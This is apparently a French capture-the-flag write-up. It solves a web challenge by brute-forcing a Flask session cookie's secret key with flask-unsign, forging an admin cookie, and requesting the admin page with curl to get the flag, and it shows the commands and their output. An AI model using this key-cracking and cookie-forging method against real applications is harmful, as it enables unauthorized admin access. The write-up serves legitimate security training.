# Flasque

## Énoncé

Nos développeurs se sont surpassés pour renforcer la sécurité de notre application (au prix d'une interface web minimaliste).

Vérifiez la robustesse de cette nouvelle sécurité !

https://flasque.izo27k5.org 

## Solution

On se retrouve face à une appli web qui nous permet de nous enregistrer, de nous connecter, et présente un lien
vers un espace admin qui ne nous est pas accessible. Comme le titre le laisse entendre, il s'agit d'une application
Flask, cela se voit notamment sur le contenu du cookie qui est typique. Celui-ci contient par exemple :
`{"access_level":"guest","password":"coin","username":"plop"}`. On suppose que l'access_level demande à être passé à 
admin pour atteindre la zone protégée.

On note des comportements bizarres de l'appli :
- pas besoin de s'enregistrer avant de se connecter.
- il n'est même pas nécessaire de fournir un mot de passe pour se connecter.
- le mot de passe apparaît dans le cookie, mais seulement lors du register.

À partir de là, j'ai testé un nombre incroyable de trucs :
- des SQLi, des injections JSON
- des SSTI dans le nom d'utilisateur (il est réfléchis par l'appli)
- la recherche de fichiers et/ou répertoires connus.
- j'ai tenté de péter la clef secrète permettant de signer les cookies, à partir de rockyou. Sans grande conviction, car c'est le même principe pour [Jeton Doré](../Jeton_Doré/Jeton%20Doré.md).

En vain. Et puis, j'ai lancé [flask-unsign](https://pypi.org/project/flask-unsign/) :

```console
$ flask-unsign --unsign -c eyJhY2Nlc3NfbGV2ZWwiOiJndWVzdCIsInBhc3N3b3JkIjoiY29pbiIsInVzZXJuYW1lIjoicGxvcCJ9.Yyynhw.5rOpE8UDFJWqbfPy67_X4cqM6q4 
[*] Session decodes to: {'access_level': 'guest', 'password': 'coin', 'username': 'plop'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (13952): esdfasdfasdfea887bf2e856738055
[*] Attempted (24704): -----BEGIN PRIVATE KEY-----89f
[+] Found secret key after 45952 attemptsbywqIDen3Tce
'risky@2'
```

Ok, donc il fallait juste avoir la bonne wordlist.

Donc il nous reste à forger notre cookie avec le bon `access_level` et de tenter d'accéder à la zone admin :


```console
$ flask-unsign --sign --secret risky@2 -c '{"access_level":"admin","password":"coin","username":"plop"}'
eyJhY2Nlc3NfbGV2ZWwiOiJhZG1pbiIsInBhc3N3b3JkIjoiY29pbiIsInVzZXJuYW1lIjoicGxvcCJ9.YyyrcQ.sLXy7FaPFRB6q5v6_WybT-rxv6o

$ curl "https://flasque.izo27k5.org/admin" -H "Cookie: session=eyJhY2Nlc3NfbGV2ZWwiOiJhZG1pbiIsInBhc3N3b3JkIjoiY29pbiIsInVzZXJuYW1lIjoicGxvcCJ9.YyyrcQ.sLXy7FaPFRB6q5v6_WybT-rxv6o"
Welcome Admin ! Flag : INNN{My_5e3310n_is_Fl4sK}
```

Mouais...